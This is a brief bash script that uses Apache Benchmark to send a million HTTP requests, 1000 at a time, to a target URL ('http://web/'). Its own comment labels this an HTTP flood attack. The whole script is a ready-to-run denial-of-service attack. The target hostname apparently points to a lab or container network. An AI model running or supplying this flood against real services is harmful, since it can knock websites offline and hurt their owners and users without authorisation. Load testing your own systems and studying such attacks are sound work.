#!/bin/bash

# Target URL
TARGET_URL="http://web/"

# Number of requests to perform
NUM_REQUESTS=1000000

# Number of multiple requests to perform at a time
CONCURRENCY=1000

# Perform HTTP flood attack using Apache Benchmark
ab -n $NUM_REQUESTS -c $CONCURRENCY $TARGET_URL